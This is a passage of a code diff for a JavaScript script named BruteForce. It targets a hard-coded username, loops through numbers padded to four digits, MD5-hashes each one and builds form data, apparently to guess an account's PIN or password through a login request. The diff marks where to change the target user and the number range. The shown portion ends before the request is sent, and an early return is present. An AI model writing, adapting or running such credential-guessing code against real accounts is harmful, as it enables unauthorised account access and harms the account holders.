@@ -2,24 +2,22 @@ const request = require('request');
 const md5Hex = require('./md5Hex');
 const convert = require('./octal-converter');
 
-var username = "p1989681" // change user name
+var username = "p1989681" // change user name here
 
 async function BruteForce() {
-  for (var i = 2; i <= 2; i++) {
+  for (var i = 1005; i <= 1005; i++) { // chang range number here
     await new Promise(resolve => {
         var p = i;
+        p = p.toString();
         console.log("Testing number: " + p)
-        if ( p >= 1000)
-            p = p.toString();
-        else{
-            p = p.toString();
+        if ( i < 1000){
             var zeroCount = 4 - p.length;
-            // for (var i = 1; i <= zeroCount; i++){
-            //     p = "0" + p;
-            // }
-            console.log(zeroCount);
+            for (var z = 1; z <= zeroCount; z++){
+                p = "0" + p;
+            }
+            // console.log(zeroCount);
         }
-        console.log(p)
+        // console.log(p)
         return;
         var a = md5Hex(p);
         var formData = {
